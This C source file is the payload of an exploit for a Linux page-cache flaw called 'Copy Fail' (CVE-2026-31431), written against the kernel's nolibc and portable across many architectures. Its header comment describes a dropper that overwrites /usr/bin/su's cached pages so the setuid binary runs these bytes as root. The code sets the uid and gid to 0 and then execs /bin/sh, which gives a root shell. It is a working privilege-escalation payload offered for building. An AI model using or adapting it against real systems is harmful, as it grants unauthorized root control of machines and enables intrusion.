/* SPDX-License-Identifier: LGPL-2.1-or-later OR MIT */
/*
 * Copy Fail (CVE-2026-31431) -- payload.
 *
 * Cross-platform C payload by Tony Gies <tony.gies@crashunited.com>.
 *
 * Cross-platform shellcode, built against the kernel's nolibc/ tiny libc.
 * payload.c is plain portable C; the per-arch syscall asm lives in
 * nolibc/arch-*.h. Supported architectures (per nolibc upstream): x86_64,
 * i386, arm, aarch64, riscv32/64, mips, ppc, s390x, loongarch, m68k, sh,
 * sparc.
 *
 * nolibc doesn't ship setuid/setgid wrappers, so we use its variadic
 * syscall() macro (nolibc/sys/syscall.h) with __NR_* constants from the
 * toolchain's <asm/unistd.h>. Still no embedded asm in this file.
 *
 * Runtime story: the dropper writes these bytes over the head of
 * /usr/bin/su's page-cache pages. su's on-disk inode keeps its setuid-
 * root bit, so on execve() the kernel grants effective uid 0 and then
 * loads *these* bytes from the cache as the program. main() converts
 * the ephemeral suid grant into a full root identity, then execs /bin/sh.
 *
 * Build: see Makefile. (`make` in this directory.)
 */

#include "nolibc/nolibc.h"

/* nolibc doesn't ship setuid/setgid wrappers (the kernel selftests it's
 * designed for don't need them). It does ship a portable variadic
 * syscall() macro (see nolibc/sys/syscall.h) and an execve(). The
 * __NR_* constants come from the toolchain's <asm/unistd.h>. */

int main(void) {
    char *argv[] = { "sh", (char *)NULL };
    char *envp[] = { (char *)NULL };
    syscall(__NR_setgid, 0);
    syscall(__NR_setuid, 0);
    execve("/bin/sh", argv, envp);
    return 1;
}
